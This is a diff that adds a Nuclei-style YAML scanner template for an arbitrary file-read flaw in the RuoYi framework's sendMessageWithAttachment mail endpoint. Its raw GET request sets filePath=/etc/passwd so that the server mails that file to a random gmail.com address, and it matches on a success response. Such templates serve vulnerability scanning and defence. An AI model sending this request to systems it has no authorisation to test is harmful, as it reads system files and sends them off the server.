@@ -1,0 +1,29 @@
+id: RuoYi-sendMessageWithAttachment-File-reading
+
+info:
+  name: 若依框架 sendMessageWithAttachment 任意文件读取漏洞
+  author: xxx
+  severity: high
+  tags: File reading
+variables:
+  username: "{{to_lower(rand_base(12))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        GET /demo/mail/sendMessageWithAttachment?to={{username}}@gmail.com&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/etc/passwd  HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"操作成功"'
+          - '"msg":'
+          - '"code":'
+          - '200'
+        condition: and
+      - type: status
+        status: 
+          - 200
